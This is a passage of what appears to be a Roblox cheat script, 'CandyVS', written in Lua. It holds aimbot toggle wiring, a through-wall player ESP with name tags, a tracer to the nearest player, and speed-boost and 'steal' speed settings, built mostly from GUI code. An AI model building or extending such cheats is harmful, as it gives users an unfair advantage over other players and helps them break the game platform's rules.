	_G.__CandyVSLaggerAimbotPreviousLagger = nil
	if selectedMode ~= "Lagger" then selectMode("Lagger") end
	if _G.CandyVSLagger and _G.CandyVSLagger.SetEnabled and _G.CandyVSLagger.IsEnabled then
	_G.__CandyVSLaggerAimbotPreviousLagger = _G.CandyVSLagger.IsEnabled() == true
	pcall(_G.CandyVSLagger.SetEnabled, true)
	else
	if _G.__openLaggerGUI then pcall(_G.__openLaggerGUI, false) end
	task.spawn(function()
	for _ = 1, 30 do
	if not toggleStates["Lagger Aimbot"] then return end
	if _G.CandyVSLagger and _G.CandyVSLagger.SetEnabled and _G.CandyVSLagger.IsEnabled then
	_G.__CandyVSLaggerAimbotPreviousLagger = _G.CandyVSLagger.IsEnabled() == true
	pcall(_G.CandyVSLagger.SetEnabled, true)
	return
	end
	task.wait(0.1)
	end
	end)
	end
	if not toggleStates["Aimbot"] then
	toggleStates["Aimbot"] = true
	if toggleVisualUpdaters["Aimbot"] then pcall(toggleVisualUpdaters["Aimbot"]) end
	if FeaturePostToggle["Aimbot"] then pcall(FeaturePostToggle["Aimbot"], true) end
	end
	else
	if selectedMode == "Lagger" and _G.__CandyVSLaggerAimbotPreviousMode and _G.__CandyVSLaggerAimbotPreviousMode ~= "Lagger" then
	selectMode(_G.__CandyVSLaggerAimbotPreviousMode)
	end
	if not _G.__CandyVSLaggerAimbotPreviousAimbot and toggleStates["Aimbot"] then
	toggleStates["Aimbot"] = false
	if toggleVisualUpdaters["Aimbot"] then pcall(toggleVisualUpdaters["Aimbot"]) end
	if FeaturePostToggle["Aimbot"] then pcall(FeaturePostToggle["Aimbot"], false) end
	end
	if _G.__CandyVSLaggerAimbotPreviousLagger == false and _G.CandyVSLagger and _G.CandyVSLagger.SetEnabled then
	pcall(_G.CandyVSLagger.SetEnabled, false)
	end
	_G.__CandyVSLaggerAimbotPreviousMode = nil
	_G.__CandyVSLaggerAimbotPreviousAimbot = nil
	_G.__CandyVSLaggerAimbotPreviousLagger = nil
	end
	end
	if not _G.__CandyVSBatAimbotV1 and FeaturePostToggle["Aimbot"] then
		_G.__CandyVSBatAimbotV1 = FeaturePostToggle["Aimbot"]
		FeaturePostToggle["Aimbot"] = function(active)
			local ver = tonumber(_G.__batAimbotVersion) == 2 and 2 or 1
			if ver == 2 then
				if active and _G.__CandyVSBatAimbotV1 then
					pcall(_G.__CandyVSBatAimbotV1, false)
				end
				if type(_G.__CandyVSBatAimbotV2) == "function" then
					pcall(_G.__CandyVSBatAimbotV2, active == true)
				elseif active then
					warn("[CandyVS] Bat Aimbot V2 selected but not installed yet.")
				end
				return
			end
			if active and _G.__CandyVSStopBatAimbotV2 then
				pcall(_G.__CandyVSStopBatAimbotV2)
			end
			if _G.__CandyVSBatAimbotV1 then
				pcall(_G.__CandyVSBatAimbotV1, active == true)
			end
		end
	end
	if toggleStates["Aimbot"] then
	task.defer(function()
	if FeaturePostToggle["Aimbot"] then
	FeaturePostToggle["Aimbot"](true)
	end
	end)
	end
	end

	do
	local espEnabled = false
	local espActivePlayers = {}
	local espLoopConn = nil
	local Camera = workspace.CurrentCamera
	local GUI2_ESP_COLOR = Color3.fromRGB(255, 140, 40)
	local GUI2_ESP_TEXT_STROKE = Color3.fromRGB(80, 35, 8)
	local function getESPThemeColors(accent)
	if _G.__CandyVSGuiTheme == "GUI 3" then
	return Color3.fromRGB(255, 45, 45), Color3.fromRGB(255, 45, 45)
	end
	if _G.__CandyVSGuiTheme == "GUI 2" then
	return GUI2_ESP_COLOR, GUI2_ESP_COLOR
	end
	return accent or _G.__CandyVSThemeAccent or Color3.fromRGB(245, 245, 250), Color3.fromRGB(0, 0, 0)
	end

	local function createESP()
	local currentFill, currentLine = getESPThemeColors()
	local esp = {
	Tracer = Drawing.new("Line"),
	Highlight = Instance.new("Highlight"),
	Lines = {}
	}

	esp.Tracer.Color = currentLine
	esp.Tracer.Thickness = 3
	esp.Tracer.Transparency = 1
	esp.Tracer.ZIndex = 2

	esp.Highlight.Name = "ESP_Highlight"
	esp.Highlight.FillColor = currentFill
	esp.Highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
	esp.Highlight.FillTransparency = 0.12
	esp.Highlight.OutlineTransparency = 0.18
	esp.Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

	local parentGui
	local ok, robGui = pcall(function() return game:GetService("CoreGui"):FindFirstChild("RobloxGui") end)
	if ok and robGui then 
	parentGui = robGui 
	else 
	parentGui = Player:FindFirstChildOfClass("PlayerGui") 
	end
	if not parentGui then 
	parentGui = game:GetService("CoreGui")
	end

	pcall(function() esp.Highlight.Parent = parentGui end)

	local nameBillboard = Instance.new("BillboardGui")
	nameBillboard.Name = "ESP_Name"
	nameBillboard.Size = UDim2.new(0, 170, 0, 28)
	nameBillboard.StudsOffset = Vector3.new(0, 1.3, 0)
	nameBillboard.AlwaysOnTop = true
	nameBillboard.Parent = parentGui

	local nameLabel = Instance.new("TextLabel")
	nameLabel.Size = UDim2.new(0, 170, 0, 28)
	nameLabel.AnchorPoint = Vector2.new(0.5, 0)
	nameLabel.Position = UDim2.new(0.5, 0, 0, 2)
	nameLabel.BackgroundTransparency = 1
	nameLabel.Text = tostring(currentPresetName or "")
	nameLabel.TextColor3 = _G.__CandyVSGuiTheme == "GUI 3" and Color3.fromRGB(255, 45, 45) or (_G.__CandyVSGuiTheme == "GUI 2" and GUI2_ESP_COLOR or Color3.fromRGB(245, 245, 255))
	nameLabel.TextSize = 15
	nameLabel.Font = Enum.Font.FredokaOne
	nameLabel.TextStrokeColor3 = _G.__CandyVSGuiTheme == "GUI 2" and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	nameLabel.TextStrokeTransparency = 0
	nameLabel.TextXAlignment = Enum.TextXAlignment.Center
	nameLabel.TextYAlignment = Enum.TextYAlignment.Center
	nameLabel.ZIndex = 5
	nameLabel.Parent = nameBillboard

	local nameOutline = Instance.new("UIStroke")
	nameOutline.Color = _G.__CandyVSGuiTheme == "GUI 2" and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	nameOutline.Thickness = 2.2
	nameOutline.Transparency = 0.12
	nameOutline.Parent = nameLabel
	for i = 1, 14 do
	local line = Drawing.new("Line")
	line.Color = currentLine
	line.Thickness = 2
	line.Transparency = 1
	line.ZIndex = 3
	table.insert(esp.Lines, line)
	end

	esp.NameTag = nameBillboard
	esp.NameLabel = nameLabel
	esp.NameOutline = nameOutline
	return esp
	end

	_G.__CandyVSRefreshESPTheme = function(accent, outlineColor)
	local fillColor, lineColor = getESPThemeColors(accent)
	for _, data in pairs(espActivePlayers) do
	if type(data) == "table" and data.esp then
	local esp = data.esp
	if esp.Tracer then pcall(function() esp.Tracer.Color = lineColor end) end
	if esp.Highlight then
	esp.Highlight.FillColor = fillColor
	esp.Highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
	end
	if esp.NameLabel then
	esp.NameLabel.TextColor3 = _G.__CandyVSGuiTheme == "GUI 3" and Color3.fromRGB(255, 45, 45) or (_G.__CandyVSGuiTheme == "GUI 2" and GUI2_ESP_COLOR or Color3.fromRGB(245, 245, 255))
	esp.NameLabel.TextStrokeColor3 = _G.__CandyVSGuiTheme == "GUI 2" and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	end
	if esp.NameOutline then
	esp.NameOutline.Color = _G.__CandyVSGuiTheme == "GUI 2" and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	end
	for _, line in ipairs(esp.Lines or {}) do pcall(function() line.Color = lineColor end) end
	end
	end
	end

	local function removeESP(plr)
	local data = espActivePlayers[plr]
	if data then
	if data.esp.Tracer then pcall(function() data.esp.Tracer:Remove() end) end
	if data.esp.Highlight then pcall(function() data.esp.Highlight:Destroy() end) end
	if data.esp.NameTag then pcall(function() data.esp.NameTag:Destroy() end) end
	for _, line in ipairs(data.esp.Lines) do
	pcall(function() line:Remove() end)
	end
	if data.loopConn then pcall(function() data.loopConn:Disconnect() end) end
	espActivePlayers[plr] = nil
	end
	end

	local function updateESP(plr, esp)
	if not espEnabled then
	esp.Tracer.Visible = false
	esp.Highlight.Enabled = false
	for _, line in ipairs(esp.Lines) do line.Visible = false end
	return
	end

	local character = plr.Character
	local hum = character and character:FindFirstChildOfClass("Humanoid")
	local trackPart = character and (
	character:FindFirstChild("HumanoidRootPart")
	or character.PrimaryPart
	or character:FindFirstChild("UpperTorso")
	or character:FindFirstChild("Torso")
	or character:FindFirstChild("Head")
	)

	if character and trackPart and (not hum or hum.Health > 0) then
	esp.Highlight.Adornee = character
	esp.Highlight.Enabled = toggleStates["ESP Players"] or false

	local _, onScreen = Camera:WorldToViewportPoint(trackPart.Position)

	if onScreen then
	esp.Tracer.Visible = false
	else
	for _, line in ipairs(esp.Lines) do line.Visible = false end
	end
	if esp.NameTag and esp.NameLabel then
	pcall(function()
	esp.NameTag.Adornee = trackPart
	esp.NameTag.Enabled = toggleStates["ESP Players"] or false
	esp.NameLabel.Text = plr.Name or plr.DisplayName or ""
	local gui2Active = _G.__CandyVSGuiTheme == "GUI 2"
	esp.NameLabel.TextColor3 = _G.__CandyVSGuiTheme == "GUI 3" and Color3.fromRGB(255, 45, 45) or (gui2Active and GUI2_ESP_COLOR or Color3.fromRGB(245, 245, 255))
	esp.NameLabel.TextStrokeColor3 = gui2Active and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	if esp.NameOutline then
	esp.NameOutline.Color = gui2Active and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	end
	end)
	end
	else
	esp.Tracer.Visible = false
	esp.Highlight.Enabled = false
	esp.Highlight.Adornee = nil
	for _, line in ipairs(esp.Lines) do line.Visible = false end
	if esp.NameTag and esp.NameLabel then
	pcall(function()
	esp.NameTag.Enabled = false
	end)
	end
	end
	end

	local function createESPForPlayer(plr)
	if plr == Player then return end
	if espActivePlayers[plr] and espActivePlayers[plr].esp then
	if espActivePlayers[plr].esp.NameTag then
	pcall(function() espActivePlayers[plr].esp.NameTag.Enabled = toggleStates["ESP Players"] or false end)
	end
	return
	end
	removeESP(plr)
	local esp = createESP()
	espActivePlayers[plr] = {esp = esp}
	end

	local function enableESP()
	if espEnabled then return end; espEnabled = true
	for _, plr in pairs(Players:GetPlayers()) do 
	if plr ~= Player then task.spawn(function() createESPForPlayer(plr) end) end 
	end
	local espAccumulator = 0
	if espLoopConn then espLoopConn:Disconnect() end
	espLoopConn = RunService.Heartbeat:Connect((function(dt)
	espAccumulator = espAccumulator + (dt or 0)
	if espAccumulator < 0.50 then return end
	espAccumulator = 0
	for plr, data in pairs(espActivePlayers) do
	if typeof(plr) == "Instance" and plr:IsA("Player") and data and data.esp then
	pcall(function() updateESP(plr, data.esp) end)
	end
	end
	end))
	local joinConn = Players.PlayerAdded:Connect(function(plr) 
	if not espEnabled or plr == Player then return end
	task.wait(0.3)
	createESPForPlayer(plr) 
	end)
	local leaveConn = Players.PlayerRemoving:Connect(function(plr) removeESP(plr) end)
	espActivePlayers._joinConn = joinConn
	espActivePlayers._leaveConn = leaveConn
	end

local function disableESP()
	espEnabled = false
	if espLoopConn then espLoopConn:Disconnect(); espLoopConn = nil end
	if espActivePlayers._joinConn then pcall(function() espActivePlayers._joinConn:Disconnect() end); espActivePlayers._joinConn = nil end
	if espActivePlayers._leaveConn then pcall(function() espActivePlayers._leaveConn:Disconnect() end); espActivePlayers._leaveConn = nil end
	for plr in pairs(espActivePlayers) do 
	if typeof(plr) == "Instance" and plr:IsA("Player") and plr ~= Player then removeESP(plr) end 
end
end
_G.__CandyVSTrackStopper(disableESP)
FeaturePostToggle["ESP Players"] = function(active)
if active then enableESP() else disableESP() end
end

if toggleStates["ESP Players"] then enableESP() end

	local oldTracer = _G.__CandyVSPlayerTracerLine
	if oldTracer then pcall(function() oldTracer:Remove() end) end
	local tracerGui = Instance.new("ScreenGui")
	tracerGui.Name = "CandyVSPlayerTracerOverlay"
	tracerGui.IgnoreGuiInset = true
	tracerGui.ResetOnSpawn = false
	tracerGui.DisplayOrder = 1000
	tracerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	tracerGui.Parent = Player:WaitForChild("PlayerGui")
	local playerTracer = Instance.new("Frame")
	playerTracer.Name = "ESPLine"
	playerTracer.AnchorPoint = Vector2.new(0.5, 0.5)
	playerTracer.BorderSizePixel = 0
	playerTracer.Active = false
	playerTracer.Visible = false
	playerTracer.ZIndex = 1
	playerTracer.Parent = tracerGui
	local tracerOutline = Instance.new("UIStroke", playerTracer)
	tracerOutline.Color = Color3.fromRGB(255, 255, 255)
	tracerOutline.Thickness = 0.7
	tracerOutline.Transparency = 0.45
	_G.__CandyVSPlayerTracerLine = {Remove = function() tracerGui:Destroy() end}
	_G.__CandyVSTrackStopper(function() tracerGui:Destroy() end)
	local playerTracerState = { scanElapsed = math.huge, targetRoot = nil }

	_G.__CandyVSTrackConn(RunService.RenderStepped:Connect((function(dt)
	if not toggleStates["Player Tracers"] then
	if playerTracer.Visible then playerTracer.Visible = false end
	playerTracerState.targetRoot = nil
	playerTracerState.scanElapsed = math.huge
	return
	end
	local ok = pcall(function()
	local activeCamera = workspace.CurrentCamera
	local myCharacter = Player.Character
	local myRoot = myCharacter and (myCharacter:FindFirstChild("LowerTorso") or myCharacter:FindFirstChild("HumanoidRootPart") or myCharacter:FindFirstChild("Torso"))
	if not activeCamera or not myRoot then
	playerTracer.Visible = false
	return
	end

	local myPosition = myRoot.Position
	playerTracerState.scanElapsed = playerTracerState.scanElapsed + (dt or 0)
	local cachedRoot = playerTracerState.targetRoot
	local cachedCharacter = cachedRoot and cachedRoot.Parent
	local cachedHumanoid = cachedCharacter and cachedCharacter:FindFirstChildOfClass("Humanoid")
	local cachedValid = cachedRoot and cachedRoot.Parent and (not cachedHumanoid or cachedHumanoid.Health > 0)
	if playerTracerState.scanElapsed >= 0.12 or not cachedValid then
	playerTracerState.scanElapsed = 0
	local closestRoot, closestDistanceSq = nil, math.huge
	for _, otherPlayer in ipairs(Players:GetPlayers()) do
	if otherPlayer ~= Player then
	local character = otherPlayer.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local root = character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("LowerTorso") or character:FindFirstChild("Torso"))
	if root and root:IsA("BasePart") and (not humanoid or humanoid.Health > 0) then
	local delta = root.Position - myPosition
	local distanceSq = delta:Dot(delta)
	if distanceSq < closestDistanceSq then
	closestRoot, closestDistanceSq = root, distanceSq
	end
	end
	end
	end
	playerTracerState.targetRoot = closestRoot
	end

	local closestRoot = playerTracerState.targetRoot
	if not closestRoot or not closestRoot.Parent then
	playerTracer.Visible = false
	return
	end
	local closestPosition = closestRoot.Position

	local from = activeCamera:WorldToViewportPoint(myPosition - Vector3.new(0, myRoot.Size.Y * 0.35, 0))
	local to, targetOnScreen = activeCamera:WorldToViewportPoint(closestPosition)
	local viewport = activeCamera.ViewportSize
	local fromPoint = Vector2.new(from.X, from.Y)
	local targetPoint = Vector2.new(to.X, to.Y)

	if not targetOnScreen or to.Z <= 0 then
	local center = viewport * 0.5
	local direction = targetPoint - center
	if to.Z <= 0 then direction = -direction end
	if direction.Magnitude < 0.001 then direction = Vector2.new(0, -1) end
	local limit = Vector2.new(math.max(8, center.X - 8), math.max(8, center.Y - 8))
	local scaleX = limit.X / math.max(math.abs(direction.X), 0.001)
	local scaleY = limit.Y / math.max(math.abs(direction.Y), 0.001)
	targetPoint = center + direction * math.min(scaleX, scaleY)
	end

	if from.Z <= 0 or fromPoint.X < 0 or fromPoint.X > viewport.X or fromPoint.Y < 0 or fromPoint.Y > viewport.Y then
	fromPoint = Vector2.new(viewport.X * 0.5, viewport.Y - 8)
	end

	local delta = targetPoint - fromPoint
	local midpoint = (fromPoint + targetPoint) * 0.5
	playerTracer.Position = UDim2.fromOffset(midpoint.X, midpoint.Y)
	playerTracer.Size = UDim2.fromOffset(math.max(delta.Magnitude, 1), 2)
	playerTracer.Rotation = math.deg(math.atan2(delta.Y, delta.X))
	local _, tracerColor = getESPThemeColors()
	playerTracer.BackgroundColor3 = tracerColor
	playerTracer.Visible = true
	end)
	if not ok then pcall(function() playerTracer.Visible = false end) end
	end)))
	end

	local function makeToggleWithInput(parent, text, featureName, speedKey, fmtFn, parseFn)
	local container = Instance.new("Frame")
	container.Name = tostring(featureName or text or "Input") .. "Stub"
	container.BackgroundTransparency = 1
	container.Visible = false
	container.Parent = parent
	return {
	container = container,
	input = nil,
	activeRef = function() return toggleStates[featureName] == true end,
	}
	end


	local tabPages = {}
	local tabNames = {"Movement", "Combat", "Visuals", "Animations"}
	local function createTabPage(name)
	local page = Instance.new("ScrollingFrame", ContentArea)
	page.Name = name .. "PageStub"
	page.BackgroundTransparency = 1
	page.BorderSizePixel = 0
	page.ScrollBarThickness = 0
	page.Visible = false
	tabPages[name] = page
	end
	for _, name in ipairs(tabNames) do createTabPage(name) end

	local function selectSectionTab(selected)
	local selectedPage = tabPages[selected]
	if not selectedPage then return end
	for name, page in pairs(tabPages) do
	page.Visible = (name == selected)
	end
	end

	selectSectionTab("Movement")

	_speedCardRefs = _speedCardRefs or {}
	local function makeUraniumSpeedCard(parent, cardTitle, modeName, boostKey, stealKey, featureName)
	local container = Instance.new("Frame")
	container.Name = tostring(modeName or cardTitle or "Speed") .. "SpeedStub"
	container.BackgroundTransparency = 1
	container.Visible = false
	container.Parent = parent
	if featureName then FeatureToggles[featureName] = function() selectMode(modeName) end end
	return container
	end


	local speedSection = makeUraniumSection(tabPages.Movement, "SPEED")
	makeUraniumSpeedCard(speedSection, "Normal Speed", "Normal", "NormalBoost", "NormalSteal", "SelectNormalMode")
	makeUraniumSpeedCard(speedSection, "Lagger Speed", "Lagger", "LaggerBoost", "LaggerSteal", "SelectLaggerMode")

	local function createCustomSpeedCard(cs)
	local featureName = "SelectCustomMode_" .. cs.name
	local boostKey = "CustomBoost_" .. cs.name
	local stealKey = "CustomSteal_" .. cs.name
	speedValues[boostKey] = cs.boost
	speedValues[stealKey] = cs.steal
	FeatureToggles[featureName] = function() selectMode(cs.name) end
	local card = makeUraniumSpeedCard(speedSection, cs.name, cs.name, boostKey, stealKey, featureName)
	local delBtn = Instance.new("TextButton", card)
	delBtn.Size = UDim2.new(0, 18, 0, 18)
	delBtn.AnchorPoint = Vector2.new(1, 1)
	delBtn.Position = UDim2.new(1, -8, 1, -8)
	delBtn.ZIndex = 30
	delBtn.BackgroundColor3 = Color3.fromRGB(240, 200, 200)
	delBtn.BorderSizePixel = 0
	delBtn.Text = "x"
	delBtn.TextColor3 = Color3.fromRGB(180, 60, 60)
	delBtn.TextSize = 11
	delBtn.Font = Enum.Font.FredokaOne
	delBtn.AutoButtonColor = false
	delBtn.TextXAlignment = Enum.TextXAlignment.Center
	delBtn.TextYAlignment = Enum.TextYAlignment.Center
	Instance.new("UICorner", delBtn).CornerRadius = UDim.new(0, 4)
	connectBtn(delBtn, function()
	for i = #customSpeeds, 1, -1 do
	if customSpeeds[i].name == cs.name then table.remove(customSpeeds, i) break end
	end
	if selectedMode == cs.name then selectMode("Normal") end
	pcall(function() card:Destroy() end)
	saveConfig()
	end)
	return card
	end

	for _, cs in ipairs(customSpeeds) do
	pcall(function() createCustomSpeedCard(cs) end)
	end

	do
	local addBtn = Instance.new("TextButton", speedSection)
	addBtn.Size = UDim2.new(1, -2, 0, 28)
	addBtn.BackgroundColor3 = Color3.fromRGB(235, 240, 245)
	addBtn.BackgroundTransparency = 0.55
	addBtn.BorderSizePixel = 0
	addBtn.Text = "+ Add Custom Speed"
	addBtn.TextColor3 = Color3.fromRGB(100, 140, 200)
	addBtn.TextSize = 11
	addBtn.Font = Enum.Font.FredokaOne
	addBtn.AutoButtonColor = false
	Instance.new("UICorner", addBtn).CornerRadius = UDim.new(0, 6)
	local addStroke = Instance.new("UIStroke", addBtn)
	addStroke.Color = Color3.fromRGB(0, 0, 0)
	addStroke.Thickness = 1
	addStroke.Transparency = 0.3

	local formCard = nil
	connectBtn(addBtn, function()
	if formCard then pcall(function() formCard:Destroy() end) formCard = nil return end
	formCard = Instance.new("Frame", speedSection)
	formCard.Size = UDim2.new(1, -2, 0, 96)
	formCard.BackgroundColor3 = Color3.fromRGB(230, 238, 245)
	formCard.BorderSizePixel = 0
	Instance.new("UICorner", formCard).CornerRadius = UDim.new(0, 6)
	local formStroke = Instance.new("UIStroke", formCard)
	formStroke.Color = Color3.fromRGB(0, 0, 0)
	formStroke.Thickness = 1

	local nameLbl = Instance.new("TextLabel", formCard)
	nameLbl.Size = UDim2.new(0, 40, 0, 14)
	nameLbl.Position = UDim2.new(0, 8, 0, 6)
	nameLbl.BackgroundTransparency = 1
	nameLbl.Text = "Name"
	nameLbl.TextColor3 = Color3.fromRGB(100, 140, 190)
	nameLbl.TextSize = 9
	nameLbl.Font = Enum.Font.FredokaOne
	nameLbl.TextXAlignment = Enum.TextXAlignment.Left
	local nameBox = Instance.new("TextBox", formCard)
	nameBox.Size = UDim2.new(0, 120, 0, 20)
	nameBox.Position = UDim2.new(0, 8, 0, 21)
	nameBox.BackgroundColor3 = Color3.fromRGB(245, 247, 250)
	nameBox.BorderSizePixel = 0
	nameBox.Text = ""
	nameBox.PlaceholderText = "My Speed"
	nameBox.Font = Enum.Font.FredokaOne
	nameBox.TextSize = 11
	nameBox.TextColor3 = Color3.fromRGB(30, 90, 200)
	nameBox.ClearTextOnFocus = false
	Instance.new("UICorner", nameBox).CornerRadius = UDim.new(0, 4)
	local nameStroke = Instance.new("UIStroke", nameBox)
	nameStroke.Color = Color3.fromRGB(0, 0, 0)
	nameStroke.Thickness = 1

	local boostLbl = Instance.new("TextLabel", formCard)
	boostLbl.Size = UDim2.new(0, 50, 0, 14)
	boostLbl.Position = UDim2.new(0, 140, 0, 6)
	boostLbl.BackgroundTransparency = 1
	boostLbl.Text = "Boost"
	boostLbl.TextColor3 = Color3.fromRGB(100, 140, 190)
	boostLbl.TextSize = 9
	boostLbl.Font = Enum.Font.FredokaOne
	boostLbl.TextXAlignment = Enum.TextXAlignment.Left
	local boostBox = Instance.new("TextBox", formCard)
	boostBox.Size = UDim2.new(0, 56, 0, 20)
	boostBox.Position = UDim2.new(0, 140, 0, 21)
	boostBox.BackgroundColor3 = Color3.fromRGB(220, 238, 255)
	boostBox.BorderSizePixel = 0
	boostBox.Text = "59"
	boostBox.Font = Enum.Font.FredokaOne
	boostBox.TextSize = 12
	boostBox.TextColor3 = Color3.fromRGB(30, 90, 200)
	boostBox.TextXAlignment = Enum.TextXAlignment.Center
	boostBox.ClearTextOnFocus = false
	Instance.new("UICorner", boostBox).CornerRadius = UDim.new(0, 5)
	local boostStroke2 = Instance.new("UIStroke", boostBox)
	boostStroke2.Color = Color3.fromRGB(0, 0, 0)
	boostStroke2.Thickness = 1

	local stealLbl = Instance.new("TextLabel", formCard)
	stealLbl.Size = UDim2.new(0, 50, 0, 14)
	stealLbl.Position = UDim2.new(0, 204, 0, 6)
	stealLbl.BackgroundTransparency = 1
	stealLbl.Text = "Steal"
	stealLbl.TextColor3 = Color3.fromRGB(100, 140, 190)
	stealLbl.TextSize = 9
	stealLbl.Font = Enum.Font.FredokaOne
	stealLbl.TextXAlignment = Enum.TextXAlignment.Left
	local stealBox = Instance.new("TextBox", formCard)
	stealBox.Size = UDim2.new(0, 56, 0, 20)
	stealBox.Position = UDim2.new(0, 204, 0, 21)
	stealBox.BackgroundColor3 = Color3.fromRGB(220, 238, 255)
	stealBox.BorderSizePixel = 0
	stealBox.Text = "29"
	stealBox.Font = Enum.Font.FredokaOne
	stealBox.TextSize = 12
	stealBox.TextColor3 = Color3.fromRGB(30, 90, 200)
	stealBox.TextXAlignment = Enum.TextXAlignment.Center
	stealBox.ClearTextOnFocus = false
	Instance.new("UICorner", stealBox).CornerRadius = UDim.new(0, 5)
	local stealStroke2 = Instance.new("UIStroke", stealBox)
	stealStroke2.Color = Color3.fromRGB(0, 0, 0)
	stealStroke2.Thickness = 1

	boostBox.InputChanged:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.TextInput then
	boostBox.Text = boostBox.Text:gsub("[^0-9]", "")
	end
	end)
	stealBox.InputChanged:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.TextInput then
	stealBox.Text = stealBox.Text:gsub("[^0-9]", "")
	end
	end)

	local confirmBtn = Instance.new("TextButton", formCard)
	confirmBtn.Size = UDim2.new(1, -16, 0, 24)
	confirmBtn.Position = UDim2.new(0, 8, 0, 50)
	confirmBtn.BackgroundColor3 = Color3.fromRGB(50, 130, 255)
	confirmBtn.BorderSizePixel = 0
	confirmBtn.Text = "Add Speed"
	confirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	confirmBtn.TextSize = 11
	confirmBtn.Font = Enum.Font.FredokaOne
	confirmBtn.AutoButtonColor = false
	Instance.new("UICorner", confirmBtn).CornerRadius = UDim.new(0, 5)

	local errLbl = Instance.new("TextLabel", formCard)
	errLbl.Size = UDim2.new(1, -16, 0, 14)
	errLbl.Position = UDim2.new(0, 8, 0, 78)
	errLbl.BackgroundTransparency = 1
	errLbl.Text = ""
	errLbl.TextColor3 = Color3.fromRGB(200, 60, 60)
	errLbl.TextSize = 9
	errLbl.Font = Enum.Font.FredokaOne
	errLbl.TextXAlignment = Enum.TextXAlignment.Left

	connectBtn(confirmBtn, function()
	local cname = nameBox.Text:match("^%s*(.-)%s*$")
	local cboost = tonumber(boostBox.Text)
	local csteal = tonumber(stealBox.Text)
	if not cname or #cname < 1 then errLbl.Text = "Enter a name" return end
	if not cboost or cboost < 1 or cboost > 200 then errLbl.Text = "Boost: 1-200" return end
	if not csteal or csteal < 1 or csteal > 200 then errLbl.Text = "Steal: 1-200" return end
	for _, cs in ipairs(customSpeeds) do
	if cs.name == cname then errLbl.Text = "Name already exists" return end
	end
	if cname == "Normal" or cname == "Lagger" or cname == "Desync" then errLbl.Text = "Reserved name" return end
	local cs = { name = cname, boost = cboost, steal = csteal }
	table.insert(customSpeeds, cs)
	pcall(function() createCustomSpeedCard(cs) end)
	pcall(function() formCard:Destroy() end)
	formCard = nil
	saveConfig()
	end)
	end)
	end

	for _, ref in ipairs(_speedCardRefs) do if ref.updateVisual then pcall(ref.updateVisual) end end

	local movementSection = makeUraniumSection(tabPages.Movement, "MOVEMENT")
	local autoplayRow = makeToggle(movementSection, "Auto Play", "Autoplay")
	do
	local autoplayCard = nil
	for _, child in ipairs(autoplayRow:GetChildren()) do
	if child:IsA("TextButton") then autoplayCard = child; break end
	end
	if autoplayCard then
	local autoplayModeButton = Instance.new("TextButton", autoplayCard)
	autoplayModeButton.Name = "AutoplayModeButton"
	autoplayModeButton.Size = UDim2.new(0, 56, 0, 20)
	autoplayModeButton.Position = UDim2.new(1, -120, 0.5, -10)
	autoplayModeButton.BackgroundColor3 = Color3.fromRGB(30,30,38)
	autoplayModeButton.BorderSizePixel = 0
	autoplayModeButton.Text = string.upper(_G.__autoplayMode or "Full")
	autoplayModeButton.TextColor3 = Color3.fromRGB(225,238,255)
	autoplayModeButton.TextSize = 10
	autoplayModeButton.Font = Enum.Font.FredokaOne
	autoplayModeButton.AutoButtonColor = false
	autoplayModeButton.ZIndex = 10
	Instance.new("UICorner", autoplayModeButton).CornerRadius = UDim.new(0, 4)
	local autoplayModeStroke = Instance.new("UIStroke", autoplayModeButton)
	autoplayModeStroke.Color = Color3.fromRGB(255,255,255)
	autoplayModeStroke.Thickness = 1
	autoplayModeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	attachCleanHubTap(autoplayModeButton, function()
	_G.__autoplayMode = (_G.__autoplayMode == "Semi") and "Full" or "Semi"
	autoplayModeButton.Text = string.upper(_G.__autoplayMode)
	saveConfig()
	end)
	end
	end
	makeToggleNoKeybind(movementSection, "Auto Carry Speed", "Auto Carry Speed")
	do
	local carryRow = makeToggle(movementSection, "Carry Speed", "Carry Speed")

	local carryCard = nil
	for _, ch in ipairs(carryRow:GetChildren()) do
	if ch:IsA("TextButton") then carryCard = ch; break end
	end
	pcall(function() styleSmallToggle(carryRow) end)

	if carryCard then
	local vBtn = Instance.new("TextButton", carryCard)
	vBtn.Size = UDim2.new(0, 56, 0, 20)
	vBtn.Position = UDim2.new(1, -120, 0.5, -10)
	vBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	vBtn.BorderSizePixel = 0
	vBtn.Text = "V1"
	vBtn.TextColor3 = Color3.fromRGB(225,238,255)
	vBtn.TextSize = 10
	vBtn.Font = Enum.Font.FredokaOne
	vBtn.AutoButtonColor = false
	vBtn.ZIndex = 10
	Instance.new("UICorner", vBtn).CornerRadius = UDim.new(0, 4)
	local vStroke = Instance.new("UIStroke", vBtn)
	vStroke.Color = Color3.fromRGB(255,255,255)
	vStroke.Thickness = 1
	vStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local function getBindPill()
	for _, c in ipairs(carryCard:GetChildren()) do
	if c:IsA("TextButton") and c ~= vBtn and c.Size.X.Offset == 48 and c.Position.X.Scale == 1 and c.Position.X.Offset == -54 then
	return c
	end
	end
	return nil
	end

	local function applyV1Mode()
	carrySpeedMode = "v1"
	vBtn.Text = "V1"
	vBtn.TextColor3 = Color3.fromRGB(225,238,255)
	vBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	vBtn.Position = UDim2.new(1, -120, 0.5, -10)
	local pill = getBindPill()
	if pill then pill.Visible = true end
	end

	local function applyV2Mode()
	carrySpeedMode = "v2"
	vBtn.Text = "V2"
	vBtn.TextColor3 = Color3.fromRGB(225,238,255)
	vBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
